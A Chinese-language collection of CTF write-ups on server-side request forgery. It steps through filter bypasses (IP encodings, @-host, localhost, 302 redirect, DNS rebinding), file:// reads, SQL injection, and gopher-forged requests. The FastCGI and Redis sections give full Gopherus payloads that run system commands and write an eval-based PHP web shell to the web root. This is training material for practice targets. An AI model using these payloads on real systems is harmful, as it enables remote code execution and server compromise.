---
comments: true

---

# SSRF注入

<!-- Imported from D:\\Book\\Web\\Chapter15\15-1.md -->
### file 伪协议读取任意文件

话不多说，直接上题（BUUCTF）

![](https://pic1.imgdb.cn/item/67b17da3d0e0a243d4ffc410.jpg)

打开网页有登录有注册

![](https://pic1.imgdb.cn/item/67b17e1cd0e0a243d4ffc414.jpg)

访问 robots.txt 发现有个不可访问文件

![](https://pic1.imgdb.cn/item/67b17e32d0e0a243d4ffc41a.jpg)

下载下来拿到源码

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

重点是这段代码，先初始化 cURL 会话并返回一个 cURL 句柄

设置 cURL 选项，指定要请求的 URL，1 表示开启执行 curl_exec() 时

返回响应内容而不是直接输出，这里就存在 SSRF 漏洞

```php
function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }
```

回头去注册一个账号

![](https://pic1.imgdb.cn/item/67b18608d0e0a243d4ffc514.jpg)

看到名字是蓝色的，点击

![](https://pic1.imgdb.cn/item/67b18619d0e0a243d4ffc515.jpg)

来的一个新页面，注意 URL 参数有一个 no

![](https://pic1.imgdb.cn/item/67b18628d0e0a243d4ffc516.jpg)

改为 2 居然报错了

![](https://pic1.imgdb.cn/item/67b18635d0e0a243d4ffc517.jpg)

加一个 ' 报数据库的错误，那这里就存在 SQL 注入，加了单引号和双引号都相同的错误

![](https://pic1.imgdb.cn/item/67b1864fd0e0a243d4ffc518.jpg)

不加引号直接 or 1=1 # 回显正常

![](https://pic1.imgdb.cn/item/67b1865fd0e0a243d4ffc519.jpg)

order by 5 报错，再次测试 4 没有报错，说明只有 4 列

![](https://pic1.imgdb.cn/item/67b18681d0e0a243d4ffc51b.jpg)

直接 -1 union select 1,2,3,4 # 被过滤空格应该是

![](https://pic1.imgdb.cn/item/67b18697d0e0a243d4ffc51c.jpg)

使用 /**/ 代替空格绕过

![](https://pic1.imgdb.cn/item/67b186a8d0e0a243d4ffc51d.jpg)

接下来爆库、表、字段

![](https://pic1.imgdb.cn/item/67b186bbd0e0a243d4ffc51e.jpg)

最后发现 data 是个序列化的值

![](https://pic1.imgdb.cn/item/67b186ded0e0a243d4ffc521.jpg)

结合之前的备份代码，我们可以设置 blog 为 file 伪协议来读取 flag 文件，然后反序列化传入到第四个字段

![](https://pic1.imgdb.cn/item/67b186f1d0e0a243d4ffc523.jpg)

构造 payload 执行

![](https://pic1.imgdb.cn/item/67b18701d0e0a243d4ffc525.jpg)

右键查看源代码可以看到文件

![](https://pic1.imgdb.cn/item/67b1871cd0e0a243d4ffc526.jpg)

打开再查看源代码拿到 flag

![](https://pic1.imgdb.cn/item/67b1872cd0e0a243d4ffc52a.jpg)


<!-- Imported from D:\\Book\\Web\\Chapter15\15-10.md -->
### @指定域名绕过

话不多说，直接上题（CTFHUB）

![](https://pic1.imgdb.cn/item/687f7e2658cb8da5c8cbd450.png)

给出提示，URL 参数的值中必须包含有 `http://notfound.ctfhub.com`

可以采用 @，也就是  HTTP  基本身份认证绕过

HTTP 基本身份认证允许 Web 浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式

也就是：`http://www.xxx.com@www.yyy.com`  形式

```http
?url=http://notfound.ctfhub.com@127.0.0.1/flag.php
```

![](https://pic1.imgdb.cn/item/687f81fd58cb8da5c8cbdaf9.png)


<!-- Imported from D:\\Book\\Web\\Chapter15\15-11.md -->
### IP 转十六进制绕过

话不多说，直接上题（CTFHUB）

![](https://pic1.imgdb.cn/item/68803b8258cb8da5c8cc9a1a.png)

尝试将 `127.0.0.1` 转换为**十六进制**形式，也就是 `0x7f000001`

构造题目有所需 Payload：`?url=0x7f000001/flag.php`

![](https://pic1.imgdb.cn/item/68803ce858cb8da5c8cc9aca.png)




<!-- Imported from D:\\Book\\Web\\Chapter15\15-12.md -->
### localhost 代替 IP 绕过

话不多说，直接上题（CTFHUB）

![](https://pic1.imgdb.cn/item/68803f2a58cb8da5c8cca2cf.png)

使用 `localhost` 代替 `127.0.0.1` 绕过

![](https://pic1.imgdb.cn/item/68803f7f58cb8da5c8cca31e.png)



<!-- Imported from D:\\Book\\Web\\Chapter15\15-13.md -->
### DNS 重绑定绕过

话不多说，直接上题（CTFHUB）

![](https://pic1.imgdb.cn/item/6880442c58cb8da5c8cca8d9.png)

**🔍 什么是 DNS 重绑定（DNS Rebinding）？**

DNS 重绑定是一种攻击手法，通过操控域名解析结果，使浏览器访问原本受同源策略保护的内网地址或本地服务

攻击者注册一个域名 → 利用 DNS 控制域名解析结果 → 浏览器认为是同源 → 访问受保护资源

**🧠 攻击流程简图**

```
受害者浏览器访问 attacker.com
        ↓
第一次 DNS 返回 attacker.com → 1.2.3.4（攻击者服务器）
        ↓
浏览器加载恶意脚本
        ↓
第二次 DNS 返回 attacker.com → 127.0.0.1 / 内网 IP
        ↓
脚本利用同源策略访问本地/内网服务
```

[打开网站](https://lock.cmpxchg8b.com/rebinder.html)

![](https://pic1.imgdb.cn/item/68804a4558cb8da5c8ccd017.png)

复制下面那块代码拿到 flag

![](https://pic1.imgdb.cn/item/68804a8458cb8da5c8ccd130.png)


<!-- Imported from D:\\Book\\Web\\Chapter15\15-2.md -->
### 域名代替 IP 绕过

话不多说，直接上提（青少年 CTF 练习平台）

![](https://pic1.imgdb.cn/item/68166abe58cb8da5c8da0592.png)

打开网页不让 F12 以及右键

![](https://pic1.imgdb.cn/item/68166ab358cb8da5c8da0591.png)

Ctrl + U 发现有个 PHP 文件

![](https://pic1.imgdb.cn/item/68166b0a58cb8da5c8da059e.png)

访问页面后再次查看源码给出了提示

![](https://pic1.imgdb.cn/item/68166b4958cb8da5c8da05a8.png)

[安装工具](https://github.com/s0md3v/Arjun?tab=readme-ov-file)

```sh
pip install arjun
```

![](https://pic1.imgdb.cn/item/68166bab58cb8da5c8da05b0.png)

执行命令

```sh
arjun -u http://challenge.qsnctf.com:31303/c3s4f.php
```

可以发现有个 `shell` 参数

![](https://pic1.imgdb.cn/item/68166c4c58cb8da5c8da05c4.png)

传入参数给出了新提示

![](https://pic1.imgdb.cn/item/68166cbb58cb8da5c8da05d0.png)

扫描目录发现有个 `secret.php`

![](https://pic1.imgdb.cn/item/68166dab58cb8da5c8da05e3.png)

只允许本地访问

![](https://pic1.imgdb.cn/item/68166d8958cb8da5c8da05dd.png)

结合提示以为是要伪造 XFF 或者 Client-IP，试过了都不行

利用 `shell` 参数构造 SSRF

```http
?shell=http://127.0.0.1/secret.php
```

无果

![](https://pic1.imgdb.cn/item/68166e4e58cb8da5c8da05ef.png)

使用域名跳转绕过

```http
?shell=http://localtest.me/secret.php
```

![](https://pic1.imgdb.cn/item/68166ec458cb8da5c8da05fa.png)

访问拿到源码

![](https://pic1.imgdb.cn/item/68166f2258cb8da5c8da0601.png)

```php
<?php
show_source(__FILE__);
include('k4y.php');
include_once('flag.php');


// Challenge 1
if (isset($_GET['DrKn'])) {
    $text = $_GET['DrKn'];
    if(@file_get_contents($text) == $key) {
        echo "有点东西呢"."</br>".$key1."</br>";
    } else {
        die("貌似状态不在线啊(╯_╰)</br>");
    }
} 
    

// Challenge 2
if (isset($_GET[$key1])) {
    $damei = $_GET[$key1];
    if (hash("md4", $damei) == $damei) {
        echo "又近了一步呢，宝~"."</br>".$key2."</br>".$key3;
    } else {
        die("达咩哟~");
    }
} 


// Challenge 3
if (isset($_POST[$key2]) && isset($_POST[$key3])) {
    $user = $_POST[$key2];
    $pass = $_POST[$key3];
  
    if (strlen($user) > 4 || strlen($pass) > 5) {
          die("还得练");
      }
     if ($user !== $pass && md5($user) === md5($pass)) {  
          echo "还不错哦"."$flag";
      }
      else {
          die("nonono") ;
      }
    }

?>
```

第一关就是传入给出的 Key，但是需要用到 `data` 伪协议

![](https://pic1.imgdb.cn/item/6816712558cb8da5c8da0628.png)

第二关是一个 `md4` 的弱比较绕过，其实可以通过科学计算法比较绕过

也就是说要找一个明文是一个科学计算法 0e 开头的，然后其加密也是 0e 开头后面都是数字

```http
&M_ore.8=0e001233333333333334557778889
```

最后一关就是 `md5` 强比较绕过，都为数组即可

![](https://pic1.imgdb.cn/item/681671c258cb8da5c8da0638.png)


<!-- Imported from D:\\Book\\Web\\Chapter15\15-3.md -->
### 302 跳转绕过

话不多说，直接上题（青少年 CTF 练习平台）

![](https://pic1.imgdb.cn/item/686453bf58cb8da5c885d754.png)

访问环境时显示 url 不存在

![](https://pic1.imgdb.cn/item/686454c258cb8da5c885d82d.png)

构造 url 测试

![img](https://github.com/Jason1314Zhang/BUUCTF-WP/raw/main/N1BOOK/images/ssrf2-2.png)

![](https://pic1.imgdb.cn/item/6864565e58cb8da5c885d9c5.png)

发现可以访问百度，根据题目提示说

![](https://pic1.imgdb.cn/item/6864568758cb8da5c885d9c6.png)

我们就访问容器内部的 8000 端口，但是有过滤 `127.0.0.1` 及 `loaclhost`

利用服务器构造 302 跳转绕过

在自己的服务器构建 `302.php`

```http
url=http://{your_server}/302.php
```

```php
<?php
header("location: http://127.0.0.1:8000/api/internal/secret")
?>
```

![](https://pic1.imgdb.cn/item/6864570858cb8da5c885d9d3.png)


<!-- Imported from D:\\Book\\Web\\Chapter15\15-4.md -->
### 127.0.0.x 代替 IP 绕过

话不多说，直接上题（青少年 CTF 练习平台）

![](https://pic1.imgdb.cn/item/686453bf58cb8da5c885d754.png)

访问环境时显示 url 不存在

![](https://pic1.imgdb.cn/item/686454c258cb8da5c885d82d.png)

构造 url 测试

![img](https://github.com/Jason1314Zhang/BUUCTF-WP/raw/main/N1BOOK/images/ssrf2-2.png)

![](https://pic1.imgdb.cn/item/6864565e58cb8da5c885d9c5.png)

发现可以访问百度，根据题目提示说

![](https://pic1.imgdb.cn/item/6864568758cb8da5c885d9c6.png)

我们就访问容器内部的 8000 端口，但是有过滤 `127.0.0.1` 及 `loaclhost`

采用 `127.0.0.x` 的形式绕过，x 为 `2~255`

![](https://pic1.imgdb.cn/item/686457d758cb8da5c885d9f3.png)


<!-- Imported from D:\\Book\\Web\\Chapter15\15-5.md -->
### 0.0.0.0 代替 IP 绕过

话不多说，直接上题（青少年 CTF 练习平台）

![](https://pic1.imgdb.cn/item/686453bf58cb8da5c885d754.png)

访问环境时显示 url 不存在

![](https://pic1.imgdb.cn/item/686454c258cb8da5c885d82d.png)

构造 url 测试

![img](https://github.com/Jason1314Zhang/BUUCTF-WP/raw/main/N1BOOK/images/ssrf2-2.png)

![](https://pic1.imgdb.cn/item/6864565e58cb8da5c885d9c5.png)

发现可以访问百度，根据题目提示说

![](https://pic1.imgdb.cn/item/6864568758cb8da5c885d9c6.png)

我们就访问容器内部的 8000 端口，但是有过滤 `127.0.0.1` 及 `loaclhost`

采用 `0.0.0.0` 的形式绕过

![](https://pic1.imgdb.cn/item/6864588e58cb8da5c885da0c.png)




<!-- Imported from D:\\Book\\Web\\Chapter15\15-6.md -->
### 端口扫描

话不多说，直接上题（CTFHUB）

![](https://pic1.imgdb.cn/item/687f039058cb8da5c8cac8d0.png)

url 参数存在 SSRF 漏洞

![](https://pic1.imgdb.cn/item/687f03db58cb8da5c8cac902.png)

使用 BurpSuite 抓包遍历端口做扫描

![](https://pic1.imgdb.cn/item/687f049458cb8da5c8cac96e.png)

8255 长度不一样，推测端口开着的，看响应拿到 flag

![](https://pic1.imgdb.cn/item/687f052958cb8da5c8cacae7.png)


<!-- Imported from D:\\Book\\Web\\Chapter15\15-7.md -->
### gopher 协议伪造 HTTP 请求

话不多说，直接上题（CTFHUB）

![](https://pic1.imgdb.cn/item/687f193f58cb8da5c8caf5e1.png)

老样子直接访问 `127.0.0.1/flag.php`，回显一个输入框

![](https://pic1.imgdb.cn/item/687f19ad58cb8da5c8caf5ea.png)

查看源码拿到一个 Key 值

![](https://pic1.imgdb.cn/item/687f1a1058cb8da5c8caf5f3.png)

输入后回车，提示仅限 `127.0.0.1` 查看

![](https://pic1.imgdb.cn/item/687f1c3058cb8da5c8caf6aa.png)

我们尝试用 file:// 读取文件,得到如下代码：

```http
?url=file:///var/www/html/index.php
```

```php
<?php
 
error_reporting(0);
 
if (!isset($_REQUEST['url'])){
    header("Location: /?url=_");
    exit;
}

// 初始化 cURL，这是 PHP 提供的一个发起 HTTP 请求的库，底层可以发起 HTTP、HTTPS、FTP、gopher 等协议的请求
$ch = curl_init();

// 将用户传入的 url 参数直接传给 cURL 请求目标
curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);

// CURLOPT_HEADER: 0 不返回响应头
curl_setopt($ch, CURLOPT_HEADER, 0);

// CURLOPT_FOLLOWLOCATION, 1: 如果目标返回 3xx 跳转，cURL 会自动跟随跳转
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

// 执行请求
curl_exec($ch);

// 关闭连接，释放资源
curl_close($ch);
```

再读取 `flag.php` 的

```http
?url=file:///var/www/html/flag.php
```

```php
<?php
 
// 关闭所有错误报告，防止泄露敏感信息
error_reporting(0);
 
// 判断请求来源 IP 是否为本地地址 127.0.0.1
if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
    // 如果不是本地访问，直接提示并终止脚本
    echo "Just View From 127.0.0.1";
    return;
}
 
// 从环境变量中获取 flag（一般在靶场环境中设置）
$flag = getenv("CTFHUB");

// 对 flag 做 MD5 哈希，得到 key
$key = md5($flag);
 
// 判断用户是否通过 POST 提交了 "key"，并且值与服务器计算的 $key 相同
if (isset($_POST["key"]) && $_POST["key"] == $key) {
    // 如果提交正确，返回 flag
    echo $flag;  // 当 post 传值为 key 时出 flag
    exit;
}
?>
 
<!-- 简单的 HTML 表单，允许用户提交 key -->
<form action="/flag.php" method="post">
<input type="text" name="key">
<!-- Debug 信息：将服务器端计算的 key 显示在页面上（方便开发者调试，正常应删除） -->
<!-- Debug: key=<?php echo $key;?>-->
</form>

```

我们知道只要往 `flag.php` 传 key 值就可以得到 flag

而 `index.php` 可以利用 curl 传 url

那么我们可以用 gopher 协议在 `index.php` 中构造 POST 请求包往 `flag.php` 传 Key 值，以此获取 flag

所以我们通过 gopher 协议构造一个请求，配合 SSRF 模拟成内网用户去访问提交数据

构造这样的一个请求

![](https://pic1.imgdb.cn/item/687f1dd558cb8da5c8caf6ff.png)

直接 curl 后接 gopher 协议就先 URL 编码一次

关键的换行符是 CRLF（\r\n），而不是 LF（\n）单独使用

因为 **gopher://** 协议是**模拟原始 TCP 字节流**，而 HTTP 的协议报文换行是 `\r\n`，不能只用 `\n`

先把换行 `\r\n` 写成 **百分号编码**（url encode）：

- `\r` => `%0D`
- `\n` => `%0A`

于是变成：

```http
POST%20/flag.php%20HTTP/1.1%0D%0A
Host:%20127.0.0.1:80%0D%0A
Content-Type:%20application/x-www-form-urlencoded%0D%0A
Content-Length:%2036%0D%0A
%0D%0A
key=a840f3c56810783306b3a75f861bd31a
```

我这里思路是先跳到内网的 `index.php` 中再传入 POST 请求

所以要 URL 编码两次（在向服务器发送请求时，首先浏览器会进行一次 URL解码，因为有两个 ?url，所以会解码两次，其次服务器收到请求后，在执行 `curl` 功能时，进行第三次 URL解码）

最终使用 **gopher 协议 + 端口伪造请求**：

```http
?url=gopher://127.0.0.1:80/_
# _ 表示之后开始是 原始 TCP payload
```

最终 payload：

```http
?url=http://127.0.0.1:80/index.php?url=gopher://127.0.0.1:80/_POST%252520/flag.php%252520HTTP/1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application/x-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D0bd5e192bb3c5e0f3df6b8ddf4252d9c
```

![](https://pic1.imgdb.cn/item/687f203d58cb8da5c8caf79f.png)


<!-- Imported from D:\\Book\\Web\\Chapter15\15-8.md -->
### FastCGI 协议 RCE

话不多说，直接上题（CTFHUB）

![](https://pic1.imgdb.cn/item/687f45ee58cb8da5c8cb212f.png)

**1️⃣ FastCGI 简介**

FastCGI 是一种用于加速 Web 与后端程序（如 PHP-FPM）通信的协议，常见端口 `9000`

如果服务器错误暴露了 FastCGI 服务，攻击者可以伪造协议请求，**让 PHP 直接解释任意文件或执行恶意代码**

**2️⃣ SSRF 打 FastCGI 的核心原理**

利用 SSRF 请求内网 `127.0.0.1:9000` 或其他 PHP-FPM 地址，通过 **gopher://** 伪造 **FastCGI 二进制协议数据包**，让服务器解析指定文件或恶意 payload

**效果**：

- 解析任意本地 `.php` 文件（任意文件包含效果）
- 配合可控日志或 Session 写入恶意 PHP 代码实现 RCE

3️⃣ 典型利用流程

| 步骤 | 动作                                                         |
| ---- | ------------------------------------------------------------ |
| 1️⃣    | SSRF（gopher）打本地 9000 端口                               |
| 2️⃣    | 伪造 FastCGI 请求，指定 `SCRIPT_FILENAME` 指向日志、session、/proc/self/environ 等可以伪造内容的地方 |
| 3️⃣    | 让 PHP-FPM 执行恶意代码                                      |
| 4️⃣    | 成功远程命令执行                                             |

本文要利用一个脚本 [gopherus.py](https://github.com/tarunkant/Gopherus/tree/master)，这个脚本可以对 SSRF 漏洞进行利用，可以直接生成 payload 造成远程代码执行 RCE

```sh
┌──(kali㉿kali)-[~/Gopherus]
└─$ python2 gopherus.py -h                                                             
usage: gopherus.py [-h] [--exploit EXPLOIT]

optional arguments:
  -h, --help         show this help message and exit
  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix,
                     pymemcache, rbmemcache, phpmemcache, dmpmemcache
```

我们选择 fastcgi 的

```sh
python2 gopherus.py --exploit fastcgi
```

![](https://pic1.imgdb.cn/item/687f54a658cb8da5c8cb5640.png)

然后输入 `/var/www/index.php`，运行一下 ls

![](https://pic1.imgdb.cn/item/687f55a658cb8da5c8cb579a.png)

得到 payload

![](https://pic1.imgdb.cn/item/687f55c758cb8da5c8cb57bf.png)

```http
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

再做一次 URL 编码（因为走的是 `?url`）

```http
gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```

可以看到有个 `index.php`

![](https://pic1.imgdb.cn/item/687f5ca658cb8da5c8cb5fee.png)

重新跑一下脚本拿 flag

![](https://pic1.imgdb.cn/item/687f5d1e58cb8da5c8cb6017.png)

成功拿到 flag

![](https://pic1.imgdb.cn/item/687f5e2858cb8da5c8cb609a.png)



<!-- Imported from D:\\Book\\Web\\Chapter15\15-9.md -->
### Redis 协议 RCE

话不多说，直接上题（CTFHUB）

![](https://pic1.imgdb.cn/item/687f73f558cb8da5c8cb6ab6.png)

#### 1️⃣ SSRF 与 Redis 结合的核心思路

利用 **SSRF**（Server-Side Request Forgery，服务端请求伪造），让服务器主动去请求攻击者指定的 Redis 服务（或内网未授权的 Redis 服务），并向 Redis 写入恶意 payload，从而进一步实现 **远程命令执行（RCE）**

**2️⃣ SSRF Redis RCE 常见利用链**

| 阶段   | 动作                                                         |
| ------ | ------------------------------------------------------------ |
| 第一步 | SSRF 控制目标服务请求 Redis（通常使用 `gopher://` 协议，可以伪造 TCP payload） |
| 第二步 | 向 Redis 发送写入命令，修改其配置，如 `dir` 和 `dbfilename`  |
| 第三步 | 向 Redis 写入 **恶意 SSH 公钥** 或 **计划任务脚本** 到 Web 根目录或 `.ssh/authorized_keys` |
| 第四步 | 触发 Redis 保存（`SAVE`），将 payload 写入磁盘，造成任意代码执行或提权 |

本题依然可以使用 gopherus 实施攻击

![](https://pic1.imgdb.cn/item/687f797258cb8da5c8cb7bc1.png)

再 URL 编码一次

```
gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527c%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```

![](https://pic1.imgdb.cn/item/687f78d458cb8da5c8cb6d16.png)
